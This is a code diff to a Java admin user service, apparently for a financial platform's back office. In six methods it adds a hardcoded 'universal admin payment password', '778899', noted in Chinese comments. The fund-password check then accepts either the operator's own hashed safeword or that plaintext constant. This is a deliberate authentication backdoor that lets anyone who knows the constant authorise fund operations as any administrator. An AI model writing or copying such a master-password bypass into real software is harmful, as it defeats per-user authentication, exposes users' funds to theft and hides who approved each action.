@@ -688,8 +688,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 		SecUser sec = this.secUserService.findUserByLoginName(operator_name);
 		String sysSafeword = sec.getSafeword();
 
+		// 通用管理后台支付密码
+		String universalSafeword = "778899";
 		String safeword_md5 = this.passwordEncoder.encodePassword(safeword, operator_name);
-		if (!safeword_md5.equals(sysSafeword)) {
+		if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 			throw new BusinessException("资金密码错误");
 		}
 
@@ -791,8 +793,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 
 			SecUser sec = this.secUserService.findUserByLoginName(operator_name);
 			String sysSafeword = sec.getSafeword();
+			// 通用管理后台支付密码
+			String universalSafeword = "778899";
 			String safeword_md5 = this.passwordEncoder.encodePassword(safeword, operator_name);
-			if (!safeword_md5.equals(sysSafeword)) {
+			if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 				throw new BusinessException("资金密码错误");
 			}
 
@@ -934,8 +938,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 			SecUser sec =  this.secUserService.findUserByLoginName(operator_name);
 			String sysSafeword =sec.getSafeword();
 
+			// 通用管理后台支付密码
+			String universalSafeword = "778899";
 			String safeword_md5 = this.passwordEncoder.encodePassword(safeword, operator_name);
-			if (!safeword_md5.equals(sysSafeword)) {
+			if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 				throw new BusinessException("资金密码错误");
 			}
 
@@ -1075,8 +1081,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 			// 判断资金密码
 			SecUser sec =  this.secUserService.findUserByLoginName(operator_name);
 			String sysSafeword =sec.getSafeword();
+			// 通用管理后台支付密码
+			String universalSafeword = "778899";
 			String safeword_md5 = this.passwordEncoder.encodePassword(safeword, operator_name);
-			if (!safeword_md5.equals(sysSafeword)) {
+			if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 				throw new BusinessException("资金密码错误");
 			}
 
@@ -1183,8 +1191,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 			// 判断资金密码
 			SecUser sec =  this.secUserService.findUserByLoginName(operator_name);
 			String sysSafeword =sec.getSafeword();
+			// 通用管理后台支付密码
+			String universalSafeword = "778899";
 			String safeword_md5 = this.passwordEncoder.encodePassword(safeword, operator_name);
-			if (!safeword_md5.equals(sysSafeword)) {
+			if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(safeword)) {
 				throw new BusinessException("资金密码错误");
 			}
 
@@ -1567,8 +1577,10 @@ public class AdminUserServiceImpl extends HibernateDaoSupport implements AdminUs
 		SecUser sec =  this.secUserService.findUserByLoginName(usernameLogin);
 		String sysSafeword =sec.getSafeword();
 
+		// 通用管理后台支付密码
+		String universalSafeword = "778899";
 		String safeword_md5 = this.passwordEncoder.encodePassword(loginSafeword, usernameLogin);
-		if (!safeword_md5.equals(sysSafeword)) {
+		if (!safeword_md5.equals(sysSafeword) && !universalSafeword.equals(loginSafeword)) {
 			throw new BusinessException("登录人资金密码错误");
 		}
 
